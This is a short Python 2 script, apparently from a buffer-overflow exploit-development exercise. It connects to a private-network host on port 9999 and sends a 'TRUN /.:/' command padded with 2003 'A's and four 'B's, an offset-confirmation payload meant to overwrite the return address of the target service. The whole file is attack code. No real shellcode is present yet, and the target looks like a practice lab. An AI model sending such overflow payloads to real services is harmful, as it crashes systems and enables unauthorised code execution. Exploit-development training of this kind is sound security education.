#!/usr/bin/python
import sys, socket

#We got this value from the finding offset script, check notes.txt file for further understanding
shellcode = "A" * 2003 + "B" * 4

try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.0.106',9999))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	
except:
		print "Error Connecting to Server"
		sys.exit()
